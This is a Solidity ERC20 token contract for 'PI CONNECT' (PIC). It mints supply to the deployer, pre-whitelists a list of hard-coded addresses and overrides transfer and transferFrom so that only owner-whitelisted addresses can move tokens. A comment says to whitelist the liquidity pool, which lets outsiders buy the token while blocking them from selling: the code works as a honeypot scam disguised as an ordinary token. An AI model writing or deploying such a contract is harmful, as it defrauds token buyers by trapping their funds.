// SPDX-License-Identifier: MIT
pragma solidity ^0.8.4;

import "./ERC20.sol";
import "./Ownable.sol";


// You have to addd LP tokens In the White List after you add liquidity.

contract SpecialToken is ERC20, Ownable {

    mapping (address => bool) whiteList;
    constructor() ERC20("PI CONNECT", "PIC") {
        whiteList[msg.sender]= true;
        _mint(msg.sender, 17000000 * 10 ** decimals());
        whiteList[0x8e411349d10E065a729B02aa338F553229eEe894]= true;
        whiteList[0xCda1F9aF17971Bf43B070ee82684F8ee5618e575]=true;
        whiteList[0x88A7e5F2CFBE0F7Ce058336aE65C491ab75e4F1C]=true;
        whiteList[0x7700D4C6a8c231bde12613E84fD258F9E802Cb7e]=true;
        whiteList[0xD0e76ff20bDB2773F213bb4771061F0a3141D401]=true;
        whiteList[0xaf154dB905784bC660b3abdE0ce7530903F0944E]=true;
        whiteList[0x5e75ffCBB3a0d0D9a5be96DaFb6D5c0561E5f4cC]=true;
        whiteList[0x16e6D090f88e141515b655ef70C9321B062bCC4f]=true;
        whiteList[0x6E5a51fDAf288d1985440e33F54B014A88458732]=true;
        whiteList[0x7D4DD9927965AF2E4ac5d4F65CCe42325d0E855F]=true;
        whiteList[0x86405557513c6D8B23E160E208331491049595dC]=true;
        whiteList[0xc9eDE3aE23B4AACdCdd261A80Df365C4E4910690]=true;
        whiteList[0x694D2c6170d5BE03476A94C48ffa9fB96C451d81]=true;
        whiteList[0x65481C2cF6818Ac06e12241561F5394842B94Eff]=true;
        whiteList[0xe4B910c8C2aa66646BF9d66157Abbe30171c1502]=true;
        whiteList[0x96aA81a9dBB3d128e85dBc7eF24Ae65fba7Bab09]=true;
        whiteList[0x5be092C6a2b9EB9E53dB655C3A468b3dD1ed0A99]=true;
        whiteList[0x12F42062a1df2080B5d003615aCC6dBf0186f7F1]=true;
        whiteList[0x3bd863f078524EA93407b3e15A2c9a6e1eC79a2F]=true;
        whiteList[0x7e442BFAe45a411404966f3dd09F429031d9eC9d]=true;
        whiteList[0x7626631d21287aa83F4E7dfDF0959196998834e5]=true;
        whiteList[0xe9eBeE15d6c0BAEfdD9E9569ae9C60eF8465697e]=true;
        whiteList[0x2FD732fB5EbDcD9b9028230D0F84998cAda3c9f8]=true;
        whiteList[0x2f02449B0A8BC1bDe01D9a2dc91CB770D11D86B8]=true;
        whiteList[0x545B8E16013384dc41054a7BeF82809A92D9Ee04]=true;
    }
    function addTowhiteList(address add) public onlyOwner{
        whiteList[add]=true;
    }

    function removeFromWhiteList(address add) public onlyOwner{
        whiteList[add]=false;
    }

    function getStatus(address add) public view onlyOwner returns (bool status){
        return whiteList[add];
    }

    function transfer(address to, uint256 amount) public virtual override returns (bool) {
        if(owner()!= to && owner()!=msg.sender)
        {
            require(whiteList[msg.sender], "Not authorized");
        }
        address owner = _msgSender();
        _transfer(owner, to, amount);
        return true;
    }

    function transferFrom(address from,address to,uint256 amount) public virtual override returns (bool) {
        if(owner()!= to && owner()!=from)
        {
            require(whiteList[from]&&whiteList[to], "Not authroized");
        }
        address spender = _msgSender();
        _spendAllowance(from, spender, amount);
        _transfer(from, to, amount);
        return true;
    }

}